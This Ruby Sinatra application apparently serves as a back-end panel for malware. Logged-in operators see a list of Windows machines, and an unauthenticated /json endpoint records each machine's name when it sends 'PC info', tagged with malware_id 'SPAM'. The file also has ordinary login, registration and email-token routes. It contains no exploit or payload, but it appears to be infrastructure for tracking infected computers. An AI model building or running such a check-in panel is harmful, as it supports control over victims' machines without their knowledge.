module FluffyPaws
  class App < Sinatra::Base
    enable :sessions
    register Sinatra::Helpers

    configure do
      set :session_secret, load_secret
    end

    DB = Sequel.connect(ENV.fetch('DATABASE_URL'))

    get '/' do
      authorize!
      token_repository = Repositories::LoginToken.new(DB)
      token_repository.delete_login_token_by_user_id session[:user_id]
      @all_pcs = DB[:winuser].all

      @username = session[:user_id] unless session[:user_id].nil?

      haml :index
    end

    get '/register' do
      redirect to('/') if authorized?
      if session[:register_error]
        @error = session[:register_error]
        session[:register_error] = nil
      end
      haml :register
    end

    post '/register' do
      user_repository = Repositories::User.new(DB)
      register = Interactions::Register.new(user_repository)
      register.run(user_name: params[:user_name],
                   email: params[:email],
                   password: params[:password])
      if register.session
        session[:user_id] = register.session
        redirect to('/')
      else
        session[:register_error] = register.error
        redirect to('/register')
      end
    end

    get '/login' do
      redirect to('/') if authorized?
      if session[:login_error]
        @error = session[:login_error]
        session[:login_error] = nil
      end
      haml :login
    end

    post '/login' do
      user_repository = Repositories::User.new(DB)
      login = Interactions::Login.new(user_repository)
      login.run(username: params[:user],
                password: params[:password])

      if login.session
        session[:user_id] = login.session
        redirect to('/')
      else
        session[:login_error] = login.error
        redirect to('/login')
      end
    end

    get '/email-login' do
      redirect to('/') if authorized?
      @message = session[:email_login_message]
      session[:email_login_message] = nil
      haml :email_login
    end

    post '/email-login' do
      user_repository = Repositories::User.new(DB)
      token_repository = Repositories::LoginToken.new(DB)
      mailer = Mailers::TokenMailer.new
      email_login = Interactions::LogInWithEmail.new(user_repository,
                                                     token_repository,
                                                     mailer)
      email_login.run(email: params[:email])
      session[:email_login_message] = email_login.message
      redirect to('/email-login')
    end

    get '/login/:name' do
      redirect to('/') if authorized?
      token_repository = Repositories::LoginToken.new(DB)
      auth_token = Interactions::AuthorizeToken.new(token_repository)
      auth_token.run(token: params[:name])
      if auth_token.session
        session[:user_id] = auth_token.session
        redirect to('/')
      else
        session[:login_error] = auth_token.error
        redirect to('/login')
      end
    end

    get '/logout' do
      logout!
      redirect to('/login')
    end

    post '/json' do
      ds = DB[:winuser]
      request.body.rewind
      req_data = JSON.parse request.body.read

      data_kind = req_data['pc_data']['kind']
      pc_name = req_data['pc_data']['data']['Name']

      if data_kind == 'PC info'
        pc_name = 'PC name empty' if pc_name == ''
        puts ds.insert(pc_name: pc_name, malware_id: 'SPAM')
      end
    end
  end
end
